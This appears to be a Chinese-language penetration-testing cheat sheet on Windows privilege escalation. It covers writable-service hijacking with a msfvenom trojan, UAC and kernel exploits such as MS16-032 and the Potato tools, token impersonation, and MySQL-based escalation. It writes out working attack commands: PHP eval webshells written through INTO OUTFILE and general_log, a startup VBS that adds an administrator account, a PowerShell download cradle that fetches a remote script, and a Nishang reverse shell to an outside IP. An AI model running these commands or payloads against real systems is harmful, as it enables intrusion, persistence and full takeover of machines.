<h2 id="RUNAS-提高权限运行命令"><a href="#RUNAS-提高权限运行命令" class="headerlink" title="RUNAS 提高权限运行命令"></a>RUNAS 提高权限运行命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/noprofile        specifies that the user&#x27;s profile should not be loaded.  </span><br><span class="line">                  This causes the application to load more quickly, but  </span><br><span class="line">                  can cause some applications to malfunction.  </span><br><span class="line">/profile          specifies that the user&#x27;s profile should be loaded.  </span><br><span class="line">                  This is the default.  </span><br><span class="line">/env              to use current environment instead of user&#x27;s.  </span><br><span class="line">/netonly          use if the credentials specified are for remote  </span><br><span class="line">                  access only.  </span><br><span class="line">/savecred         to use credentials previously saved by the user.  </span><br><span class="line">/smartcard        use if the credentials are to be supplied from a  </span><br><span class="line">                  smartcard.  </span><br><span class="line">/user             &lt;UserName&gt; should be in form USER@DOMAIN or DOMAIN\USER  </span><br><span class="line">/showtrustlevels  displays the trust levels that can be used as arguments  </span><br><span class="line">                  to /trustlevel.  </span><br><span class="line">/trustlevel       &lt;Level&gt; should be one of levels enumerated  </span><br><span class="line">                  in /showtrustlevels.  </span><br><span class="line">program         command line for EXE.  See below for examples</span><br></pre></td></tr></table></figure>
<p>使用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">runas /user:Administrator cmd  </span><br><span class="line">runas /user:Administrator@DC cmd</span><br></pre></td></tr></table></figure>

<p>待</p>
<h2 id="无人值守安装提权"><a href="#无人值守安装提权" class="headerlink" title="无人值守安装提权"></a>无人值守安装提权</h2><p>无人值守安装是原始设备制造商、企业和其他用户在无人值守模式下安装Windows NT的一种方法</p>
<p>它以base64存储用户密码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Panther\Unattend\Unattended.xml</span><br></pre></td></tr></table></figure>
<h2 id="服务程序利用"><a href="#服务程序利用" class="headerlink" title="服务程序利用"></a>服务程序利用</h2><h3 id="accesschk-last-version"><a href="#accesschk-last-version" class="headerlink" title="accesschk-last version"></a><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">accesschk-last version</a></h3><p><a target="_blank" rel="noopener" href="https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip%0D">accesschk</a>旧版本（适用于XP，2003</p>
<p>小工具，用于检查用户和用户组对文件，目录，注册表，全局对象和系统服务的权限情况。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">usage: accesschk   </span><br><span class="line">-a Windows账号权限 *表示所有用户权限名称  </span><br><span class="line">-c 服务名称 *表示所有服务  </span><br><span class="line">-d 只处理目录或者是顶级的注册表键  </span><br><span class="line">-e 只显示设置的完整性级别   </span><br><span class="line">-f 组，和权限的完整令牌信息  </span><br><span class="line">-k 注册表键值  </span><br><span class="line">-I   </span><br><span class="line">-l 列出全部访问控制表  </span><br><span class="line">-n 只显示没有访问权限的对象  </span><br><span class="line">-o   </span><br><span class="line">-p 进程名/pid  </span><br><span class="line">-q 省略标示  </span><br><span class="line">-r 显示只读  </span><br><span class="line">-s 递归  </span><br><span class="line">-t 筛选  </span><br><span class="line">-u 隐藏报错  </span><br><span class="line">-v 详细  </span><br><span class="line">-w 显示可写  </span><br></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk users -c *| find &quot;RW&quot; # 显示用户所有有读写权限的服务</span><br></pre></td></tr></table></figure>
<h2 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h2><p>利用要求</p>
<ul>
<li>拿到的用户拥有更改服务器配置的权限</li>
</ul>
<h3 id="可写服务"><a href="#可写服务" class="headerlink" title="可写服务"></a>可写服务</h3><p>使用accesschk.exe来查询可写服务</p>
<blockquote>
<p>&#x2F;accepteula参数仅在旧版本（XP，2003）有用，其他系统可以直接无视这个参数。  </p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-------------------------------------------------  </span><br><span class="line">C:\Inetpub\wwwroot&gt;accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *  </span><br><span class="line">accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *  </span><br><span class="line">RW SSDPSRV  </span><br><span class="line">        SERVICE_ALL_ACCESS  </span><br><span class="line">RW upnphost  </span><br><span class="line">        SERVICE_ALL_ACCESS  </span><br><span class="line">  </span><br><span class="line">-------------------------------------------------  </span><br><span class="line">C:\Inetpub\wwwroot&gt;accesschk /accepteula users -c *| find &quot;RW&quot;   </span><br><span class="line">accesschk /accepteula users -c *| find &quot;RW&quot;  </span><br><span class="line">RW SSDPSRV  </span><br><span class="line">RW upnphost  </span><br></pre></td></tr></table></figure>
<p>所以当前是有两个服务是可以被当前用户写入的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">C:\Inetpub\wwwroot&gt;accesschk.exe /accepteula -ucqv SSDPSRV  </span><br><span class="line">accesschk.exe /accepteula -ucqv SSDPSRV  </span><br><span class="line">SSDPSRV  </span><br><span class="line">  RW NT AUTHORITY\SYSTEM  </span><br><span class="line">        SERVICE_ALL_ACCESS  </span><br><span class="line">  RW BUILTIN\Administrators  </span><br><span class="line">        SERVICE_ALL_ACCESS  </span><br><span class="line">  RW NT AUTHORITY\Authenticated Users  </span><br><span class="line">        SERVICE_ALL_ACCESS  </span><br><span class="line">  RW BUILTIN\Power Users  </span><br><span class="line">        SERVICE_ALL_ACCESS  </span><br><span class="line">  RW NT AUTHORITY\LOCAL SERVICE  </span><br><span class="line">        SERVICE_ALL_ACCESS  </span><br><span class="line">  </span><br><span class="line">C:\Inetpub\wwwroot&gt;accesschk.exe /accepteula -ucqv upnphost  </span><br><span class="line">accesschk.exe /accepteula -ucqv upnphost  </span><br><span class="line">upnphost  </span><br><span class="line">  RW NT AUTHORITY\SYSTEM  </span><br><span class="line">        SERVICE_ALL_ACCESS  </span><br><span class="line">  RW BUILTIN\Administrators  </span><br><span class="line">        SERVICE_ALL_ACCESS  </span><br><span class="line">  RW NT AUTHORITY\Authenticated Users  </span><br><span class="line">        SERVICE_ALL_ACCESS  </span><br><span class="line">  RW BUILTIN\Power Users  </span><br><span class="line">        SERVICE_ALL_ACCESS  </span><br><span class="line">  RW NT AUTHORITY\LOCAL SERVICE  </span><br><span class="line">        SERVICE_ALL_ACCESS</span><br></pre></td></tr></table></figure>
<p>可以看到，如果这两个服务被启动的时候，是会以<code>NT AUTHORITY</code>权限所运行的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">SERVICE_NAME: upnphost  </span><br><span class="line">        TYPE               : 20  WIN32_SHARE_PROCESS  </span><br><span class="line">        START_TYPE         : 3   DEMAND_START ## 守护状态，所以是可以启动的  </span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL  </span><br><span class="line">        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService  </span><br><span class="line">        LOAD_ORDER_GROUP   :  </span><br><span class="line">        TAG                : 0  </span><br><span class="line">        DISPLAY_NAME       : Universal Plug and Play Device Host  </span><br><span class="line">        DEPENDENCIES       : SSDPSRV  </span><br><span class="line">        SERVICE_START_NAME : NT AUTHORITY\LocalService  </span><br><span class="line">  </span><br><span class="line">C:\Inetpub\wwwroot&gt;sc qc SSDPSRV  </span><br><span class="line">sc qc SSDPSRV  </span><br><span class="line">[SC] GetServiceConfig SUCCESS  </span><br><span class="line">  </span><br><span class="line">SERVICE_NAME: SSDPSRV  </span><br><span class="line">        TYPE               : 20  WIN32_SHARE_PROCESS  </span><br><span class="line">        START_TYPE         : 4   DISABLED  ### 禁止启动，需要手动修改为可启动  </span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL  </span><br><span class="line">        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService  </span><br><span class="line">        LOAD_ORDER_GROUP   :  </span><br><span class="line">        TAG                : 0  </span><br><span class="line">        DISPLAY_NAME       : SSDP Discovery Service  </span><br><span class="line">        DEPENDENCIES       :  </span><br><span class="line">        SERVICE_START_NAME : NT AUTHORITY\LocalService</span><br></pre></td></tr></table></figure>
<p>可以看到一个服务是可以启动，一个是被禁止状态，但是我们还是可以开启他。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">## 设置服务的启动程序 为 恶意程序所在的路径（msfvenom生成的木马  </span><br><span class="line">C:\Inetpub\wwwroot&gt;sc config ssdpsrv binpath= &quot;C:\Inetpub\wwwroot\shell.exe&quot;  </span><br><span class="line">  </span><br><span class="line">sc config ssdpsrv binpath= &quot;C:\Inetpub\wwwroot\shell.exe&quot;  </span><br><span class="line">[SC] ChangeServiceConfig SUCCESS  </span><br><span class="line"></span><br><span class="line">## 设置obj，需要先设置这个，否则会报错。  </span><br><span class="line">C:\Inetpub\wwwroot&gt;sc config ssdpsrv  obj= &quot;.\LocalSystem&quot; password= &quot;&quot;  </span><br><span class="line">  </span><br><span class="line">sc config ssdpsrv  obj= &quot;.\LocalSystem&quot; password= &quot;&quot;  </span><br><span class="line">[SC] ChangeServiceConfig SUCCESS  </span><br><span class="line">  </span><br><span class="line">## 将服务从被禁止状态设置为启动状态  </span><br><span class="line">C:\Inetpub\wwwroot&gt;sc config ssdpsrv start= &quot;auto&quot;  </span><br><span class="line">  </span><br><span class="line">sc config ssdpsrv start= &quot;auto&quot;  </span><br><span class="line">[SC] ChangeServiceConfig SUCCESS  </span><br></pre></td></tr></table></figure>
<p><code>sc start ssdpsrv</code>启动服务，就能以管理员上线了。</p>
<h3 id="不带引号的不安全服务"><a href="#不带引号的不安全服务" class="headerlink" title="不带引号的不安全服务"></a>不带引号的不安全服务</h3><ul>
<li><a target="_blank" rel="noopener" href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/">Windows Privilege Escalation Methods for Pentesters</a></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\windows\\&quot; |findstr /i /v &quot;&quot;&quot;  </span><br></pre></td></tr></table></figure>
<p>查看服务目录是否可写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;get-acl -Path &#x27;C:\Program Files (x86)\XXX&#x27; | format-list&quot;</span><br></pre></td></tr></table></figure>

<h3 id="不安全的文件-x2F-文件夹权限配置–待填坑"><a href="#不安全的文件-x2F-文件夹权限配置–待填坑" class="headerlink" title="不安全的文件&#x2F;文件夹权限配置–待填坑"></a>不安全的文件&#x2F;文件夹权限配置–待填坑</h3><h2 id="绕过应用程序控制策略-AppLocker"><a href="#绕过应用程序控制策略-AppLocker" class="headerlink" title="绕过应用程序控制策略(AppLocker)"></a>绕过应用程序控制策略(AppLocker)</h2><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/AppLocker">Wiki:AppLocker</a></p>
<p>AppLocker是Windows 7中引入的应用程序白名单技术。它允许根据程序路径、发布者和散列，限制用户可以执行哪些程序。</p>
<p>AppLocker默认规则的目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\spool\drivers\color</span><br></pre></td></tr></table></figure>
<h2 id="注册表提权"><a href="#注册表提权" class="headerlink" title="注册表提权"></a>注册表提权</h2><h2 id="UAC绕过"><a href="#UAC绕过" class="headerlink" title="UAC绕过"></a>UAC绕过</h2><ul>
<li><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/archive/msdn-magazine/2007/january/teach-your-apps-to-work-with-windows-vista-user-account-control">微软UAC</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.codeproject.com/Articles/19165/Vista-UAC-The-Definitive-Guide">UAC指南</a></p>
</li>
</ul>
<h3 id="msf模块"><a href="#msf模块" class="headerlink" title="msf模块"></a>msf模块</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/local/bypassuac</span><br></pre></td></tr></table></figure>
<h3 id="msf-提高运行级别提权"><a href="#msf-提高运行级别提权" class="headerlink" title="msf 提高运行级别提权"></a>msf 提高运行级别提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/local/ask</span><br></pre></td></tr></table></figure>
<h3 id="手动利用"><a href="#手动利用" class="headerlink" title="手动利用"></a>手动利用</h3><p><a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/">UAC Bypass – Fodhelper</a></p>
<h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><h2 id="系统漏洞提权"><a href="#系统漏洞提权" class="headerlink" title="系统漏洞提权"></a>系统漏洞提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ms14_058_track_popup_menu ms15_051 ms16_016</span><br></pre></td></tr></table></figure>
<h3 id="MS16-032"><a href="#MS16-032" class="headerlink" title="MS16_032"></a>MS16_032</h3><h4 id="补丁编号"><a href="#补丁编号" class="headerlink" title="补丁编号"></a>补丁编号</h4><ul>
<li>KB3139914</li>
</ul>
<h4 id="影响系统版本"><a href="#影响系统版本" class="headerlink" title="影响系统版本"></a>影响系统版本</h4><ul>
<li>Windows Vista</li>
<li>Windows 7</li>
<li>Windows 8.1</li>
<li>Windows 10</li>
<li>Windows 2008 Server</li>
<li>Windows 2012 Server</li>
</ul>
<h4 id="系统要求"><a href="#系统要求" class="headerlink" title="系统要求"></a>系统要求</h4><p>系统至少有2个以上CPU核心，否则利用脚本无法运行；PowerShell v2.0及以上版本。</p>
<p>并且要注意使用的powershell位数。</p>
<p>原版exp（39719）会Spawn一个System Shell出来，只能通过Remote Desktop获取。建议能使用带命令执行的exp。</p>
<h4 id="msf利用"><a href="#msf利用" class="headerlink" title="msf利用"></a>msf利用</h4><h4 id="手动利用-1"><a href="#手动利用-1" class="headerlink" title="手动利用"></a>手动利用</h4><ul>
<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/39574">exploit-db-39754</a> </li>
<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/39719">exploit-db-39719</a></li>
</ul>
<p>先获取一个本地低权限用户的shell</p>
<p><img src="https://images.atsud0.me/images/post/image-20201221103449109.png"></p>
<p>我这里是反弹了一个64位的powershell回来。</p>
<p>接着执行exp提权，但是这里我用的是能携带参数命令执行的</p>
<p><img src="https://images.atsud0.me/images/post/image-20201221103702235.png"></p>
<p><img src="https://images.atsud0.me/images/post/image-20201221103742986.png"></p>
<p>使用的exp为：<a target="_blank" rel="noopener" href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1">Powershell-Empire-Invoke-MS16032</a> 在脚本最后添加</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-MS16032 -Command &quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.119.163/shell.ps1&#x27;)&quot;</span><br></pre></td></tr></table></figure>
<p>然后远程加载即可。<br>反弹shell，使用的exp为:<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1">Nishang-Invoke-PowerShellTcp</a> </p>
<p>同样在脚本最后添加：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PowerShellTcp -Reverse -IPAddress 192.168.119.163 -Port 1443</span><br></pre></td></tr></table></figure>
<h3 id="土豆家族"><a href="#土豆家族" class="headerlink" title="土豆家族"></a>土豆家族</h3><p><a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato">多汁土豆</a><a target="_blank" rel="noopener" href="https://github.com/ivanitlearning/Juicy-Potato-x86"></a><a target="_blank" rel="noopener" href="https://github.com/itm4n/PrintSpoofer"></a><br><a target="_blank" rel="noopener" href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/">PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019</a><br><a target="_blank" rel="noopener" href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows-Token%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90%E7%9A%84%E5%88%A9%E7%94%A8/">Windows Token九种权限的利用</a><br><a target="_blank" rel="noopener" href="https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/">Windows本地提权工具Juicy Potato测试分析</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure>
<p>利用细节:</p>
<ul>
<li>如果默认CLSD不可用则找到目标系统能用的CLSD</li>
</ul>
<h4 id="多汁土豆"><a href="#多汁土豆" class="headerlink" title="多汁土豆"></a>多汁土豆</h4><h4 id="流氓土豆-RoguePotato-exe"><a href="#流氓土豆-RoguePotato-exe" class="headerlink" title="流氓土豆 RoguePotato.exe"></a>流氓土豆 RoguePotato.exe</h4><p><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RoguePotato">antonioCoco-RoguePotato</a></p>
<p><a target="_blank" rel="noopener" href="https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/">No more JuicyPotato? Old story, welcome RoguePotato!</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/breenmachine/RottenPotatoNG"></a></p>
<h3 id="CVE-2020-0796"><a href="#CVE-2020-0796" class="headerlink" title="CVE-2020-0796"></a>CVE-2020-0796</h3><p>[[CVE-2020-0796漏洞复现]]</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">incognito </span><br><span class="line">use incognito </span><br><span class="line">load incognito</span><br><span class="line"></span><br><span class="line">list_tokens -u </span><br><span class="line">list_tokens -g </span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure>
<h2 id="mysql-提权"><a href="#mysql-提权" class="headerlink" title="mysql 提权"></a>mysql 提权</h2><h3 id="直接写webshell"><a href="#直接写webshell" class="headerlink" title="直接写webshell"></a>直接写webshell</h3><h4 id="secure-file-priv写"><a href="#secure-file-priv写" class="headerlink" title="secure_file_priv写"></a>secure_file_priv写</h4><blockquote>
<p>secure_file_priv 为空或网站根目录在可写目录下</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php eval($_POST[admin])?&gt;&#x27; into outfile &#x27;C://phpStudy//WWW//shell.php&#x27;</span><br></pre></td></tr></table></figure>
<h4 id="日志写入一句话"><a href="#日志写入一句话" class="headerlink" title="日志写入一句话"></a>日志写入一句话</h4><p>利用要求：</p>
<ul>
<li>管理员权限</li>
<li>知道网站的绝对路径</li>
</ul>
<p>必要选项：</p>
<ul>
<li>general log 指的是日志保存状态，一共有两个值（ON&#x2F;OFF）ON代表开启 OFF代表关闭。</li>
<li>general log file 指的是日志的保存路径。</li>
</ul>
<p>这两个选项能通过在<code>mysql</code>或者是在<code>phpmyadmin</code>中打开。执行一条sql语句便会被记录到日志文件中。所以只要把日志保存的路径和日志文件名设置成网站路径下的php，就可以生成一个文件，并把一句话代入到其中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=&#x27;on&#x27;;  </span><br><span class="line">set global general_log_file=&#x27;D:/phpstudy/PHPTutorial/WWW/xxx.php&#x27;  </span><br><span class="line">select &#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure>
<h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p>Mysql &lt; 5.1版本的 直接将udf.dll导出到任何位置，<br>Mysql &gt; 5.1后 应该将udf.dll放在mysql的 lib&#x2F;plugin目录下(默认不存在)</p>
<p>Windows下可以利用文件流创建目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;xxx&#x27; into dumpfile &#x27;C:\\MySQL\\lib::$INDEX_ALLOCATION&#x27;;  </span><br><span class="line">select &#x27;xxx&#x27; into dumpfile &#x27;C:\\MySQL\\lib\\plugin::$INDEX_ALLOCATION&#x27;;</span><br><span class="line">sqlmap -u &quot;vulnurl&quot; --os-shell --no-cast</span><br></pre></td></tr></table></figure>
<p>需要知道网站的绝对路径，并且数据库拥有写文件的权限。</p>
<h3 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h3><h3 id="VBS启动项提权"><a href="#VBS启动项提权" class="headerlink" title="VBS启动项提权"></a>VBS启动项提权</h3><p>通过MySQL建立表单并向表单写入恶意代码，最后从表单里面提取恶意代码并导出到系统的启动项，当系统重新启动时恶意代码将被执行。</p>
<p>要求:</p>
<ul>
<li>mysql有写文件权限</li>
<li>系统要重启</li>
<li>导出的文件没被删除</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">show databases ;  </span><br><span class="line">use test;  </span><br><span class="line">create table a (cmd text);   </span><br><span class="line">insert into a values (&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;)&quot;);   </span><br><span class="line">insert into a values (&quot;a=wshshell.run(&quot;&quot;cmd.exe /c net user test test /add&quot;&quot;,0)&quot;) ;  </span><br><span class="line">insert into a values (&quot;b=wshshell.run(&quot;&quot;cmd.exe /c net localgroup administrators test /add&quot;&quot;,0)&quot;);   </span><br><span class="line">select * from a into outfile &quot;C://Documents and Settings//administrators//「开始」菜单//程序//启动//test.vbs&quot;;</span><br></pre></td></tr></table></figure>
<p>每个系统的启动目录不一样。</p>
<p>Windows 2008 Server的启动目录为： <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\iis.vbs</code></p>
<h4 id="mysql-start-up提权"><a href="#mysql-start-up提权" class="headerlink" title="mysql_start_up提权"></a>mysql_start_up提权</h4><p>msf下模块exploit&#x2F;windows&#x2F;mysql&#x2F;mysql_start_up提权</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_start_up  </span><br><span class="line">set rhost 192.168.2.1  </span><br><span class="line">set rport 3306  </span><br><span class="line">set username root  </span><br><span class="line">set password 123456  </span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h2 id="pr-提权"><a href="#pr-提权" class="headerlink" title="pr 提权"></a>pr 提权</h2><p>要求:windows 2003</p>
<p>将pr.exe和cmd.exe和3389.reg上传到同一路径下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pr.exe &quot;net user 123 123 /add&quot; 添加用户  </span><br><span class="line">pr.exe &quot; net localgroup administrators 123 /add&quot; # 将用户添加至管理组</span><br></pre></td></tr></table></figure>
<p>导入注册表 开启3389端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regedit /s 3389.reg</span><br></pre></td></tr></table></figure>
<h2 id="滥用模拟特权"><a href="#滥用模拟特权" class="headerlink" title="滥用模拟特权"></a>滥用模拟特权</h2><ul>
<li><a href="%5Bhttps://itm4n.github.io/printspoofer-abusing-impersonate-privileges/%5D(https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)" title="" target="">原文</a>
</li>
<li><a href="%5Bhttps://github.com/itm4n/PrintSpoofer%5D(https://github.com/itm4n/PrintSpoofer)" title="" target="">利用程序下载链接</a></li>
</ul>
<h2 id="Windows-第三方驱动提权"><a href="#Windows-第三方驱动提权" class="headerlink" title="Windows 第三方驱动提权"></a>Windows 第三方驱动提权</h2><h3 id="USBPcap"><a href="#USBPcap" class="headerlink" title="USBPcap"></a>USBPcap</h3><ul>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86203">CVE-2017-6178：从补丁对比到Exploit</a></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driverquery /v</span><br></pre></td></tr></table></figure>
<p><strong>Exploit-ID：41542</strong></p>
<h2 id="滥用LAPS组用户提权（AD）"><a href="#滥用LAPS组用户提权（AD）" class="headerlink" title="滥用LAPS组用户提权（AD）"></a>滥用LAPS组用户提权（AD）</h2><p><a target="_blank" rel="noopener" href="http://bbs.learnfuture.com/topic/555">http://bbs.learnfuture.com/topic/555</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/169178">https://www.anquanke.com/post/id/169178</a></p>
<p><a target="_blank" rel="noopener" href="https://akijosberryblog.wordpress.com/2017/11/09/dump-laps-password-in-clear-text/">https://akijosberryblog.wordpress.com/2017/11/09/dump-laps-password-in-clear-text/</a></p>
